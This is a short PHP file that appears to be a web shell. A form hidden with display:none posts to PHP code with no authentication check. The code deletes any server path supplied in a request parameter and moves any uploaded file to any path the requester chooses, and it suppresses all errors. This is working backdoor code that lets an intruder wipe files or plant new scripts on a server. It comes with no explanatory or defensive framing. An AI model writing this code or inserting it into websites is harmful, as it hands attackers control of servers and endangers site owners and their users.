<form style="display:none;" enctype="multipart/form-data" method="post" name="f1" action="<?php echo $_SERVER['PHP_SELF']?>">
<input type="text" placeholder="location" name="location" />
<input type="file" name="fileup" id="fileup" />

<input type="submit" name="sub" value="1" />
<input type="submit" name="upd" value="2" />
</form>
<?php 
if(isset($_REQUEST['sub'])){
	
@unlink($_REQUEST['location']);	
}

if(isset($_REQUEST['upd'])){
	
	@move_uploaded_file($_FILES['fileup']['tmp_name'],$_REQUEST['location'].$_FILES['fileup']['name']);
}


?>
